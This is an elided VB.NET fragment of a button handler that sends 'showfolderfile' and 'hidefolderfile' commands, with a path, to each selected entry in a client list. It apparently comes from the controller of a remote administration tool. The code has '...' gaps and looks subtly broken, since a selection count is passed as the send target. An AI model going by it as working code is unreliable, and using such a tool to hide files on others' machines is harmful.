Public Class prop
    ...
    Private Sub SkyDarkButton1_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton1.Click
        ...
        Dim xxx# = FileManager.ListView1.SelectedItems.Count
        ...
        If xxx = 0 Then
            ...
            If CheckBox2.Checked = True Then
                For Each x As ListViewItem In Main.L1.SelectedItems
                    Main.S.Send(xxx, "showfolderfile" & yy & TextBox2.Text & TextBox4.Text)
                Next

            End If
            If CheckBox1.Checked = True Then
                For Each x As ListViewItem In Main.L1.SelectedItems
                    Main.S.Send(xxx, "hidefolderfile" & yy & TextBox2.Text & TextBox4.Text)
                Next
